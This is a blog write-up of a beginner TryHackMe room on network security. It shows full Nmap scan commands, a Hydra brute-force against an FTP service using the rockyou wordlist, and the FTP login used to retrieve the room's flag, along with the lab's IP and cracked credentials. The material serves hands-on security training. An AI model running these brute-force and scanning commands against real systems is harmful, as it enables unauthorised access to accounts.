---
title: Network Security (Room Walkthrough)
description: TryHackMe — Network Security (Room Walkthrough)
author: Prabin Shrestha
date: 2025-04-12 11:33:00 +0800
categories: [Writeup, TryHackMe]
tags: [writeup]
pin: false
math: true
mermaid: true
image:
  path: ../assets/img/favicon/certification/sec+.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
---


## Introduction
In this post I’ll walk you through my experience solving the **Network Security** room on TryHackMe. This room is perfect for beginners and teaches how computers communicate and how attackers might exploit network weaknesses.

> **Important:** All testing described in this write-up was performed on the TryHackMe lab machine provided by the platform. Never scan or attack systems you do not own or do not have explicit written permission to test.

---

## 🧰 Tools Used
- **Nmap** — scanning and enumeration
- **Hydra** — brute-force cracking for FTP credentials (used only against the lab machine)
- `ftp` client — simple FTP interaction

---

## 🧩 Summary / Room Breakdown
This walkthrough shows the main commands and thought process I used to enumerate services and gain the flags for the room.

### Initial reconnaissance — single-line Nmap
I used a compact, aggressive scan that enumerates versions and runs default NSE scripts across all TCP ports:

```bash
nmap -sC -sV -p- -T4 <MACHINE_IP> -vv
```

**Flags explained (brief):**
- `-sC` — default NSE scripts
- `-sV` — service/version detection
- `-p-` — scan all TCP ports (1–65535)
- `-T4` — faster timing (noisier)
- `-vv` — very verbose output

This gave me a clear picture of open ports and service versions. From the scan results I discovered the FTP service running **vsftpd 3.0.5** on a non-standard port.

---

## 🧩 Enumeration notes & quick wins
- The Nmap output listed open ports and service versions. The FTP server version (`vsftpd 3.0.5`) is useful to note for prioritization and enumeration.
- I captured relevant NSE output and banners to guide next steps.

---

## 🔐 Cracking FTP credentials (lab only)
Because SSH credentials were not available, the next step was to try password cracking for FTP using Hydra (only run in the lab environment).

### Prepare username list
I moved the two discovered usernames into a file called `users.txt`:

```bash
# open an editor and add one username per line
nano users.txt
# add:
# eddie
# quinn
```

### Hydra command used (lab)
This is the command I used to try to crack the two accounts against the FTP service on port `10021`:

```bash
hydra -t 8 -L users.txt -P /usr/share/wordlists/rockyou.txt ftp:10.10.101.15:10021
```

**Notes:**
- `-t 8` sets 8 parallel tasks. Adjust carefully in real environments.
- `-L users.txt` points to the username list file.
- `-P /usr/share/wordlists/rockyou.txt` points to the password list.
- `ftp:HOST:PORT` syntax targets the FTP service at a specific port.

> Reminder: Only run brute-force tools against systems you own or have explicit permission to test.

---

## 🧾 Using the found credentials (FTP)
After Hydra returned valid credentials I connected to the FTP server and enumerated the filesystem:

```bash
ftp <MACHINE_IP> 10021
# login with the discovered credentials (e.g. quinn / andrea)
# list files
ls -la
# download the flag
get ftp_flag.txt
# exit and view flag locally
quit
cat ftp_flag.txt
```

I used `ls -la` (since `find`/`locate` are not available inside FTP sessions) to locate the `ftp_flag.txt` file and then downloaded it to the AttackBox.

---

## 🌐 Web challenge (follow-up)
The room included a small web challenge requiring a bit of trickery. I ran a simple Nmap *null scan* to further probe the host:

```bash
nmap -sN 10.10.101.15
```

That scan helped reveal more subtle port information used to solve the web-based portion of the room and retrieve the final flag.

---

## Appendix — Quick command summary

```bash
# Full aggressive nmap scan
nmap -sC -sV -p- -T4 <MACHINE_IP> -vv

# Prepare username list
nano users.txt   # add usernames, one per line

# Hydra (lab only): FTP on port 10021
hydra -t 8 -L users.txt -P /usr/share/wordlists/rockyou.txt ftp:10.10.101.15:10021

# Connect and retrieve FTP flag
ftp <MACHINE_IP> 10021
ls -la
get ftp_flag.txt
cat ftp_flag.txt

# Additional nmap probe
nmap -sN 10.10.101.15
```

---

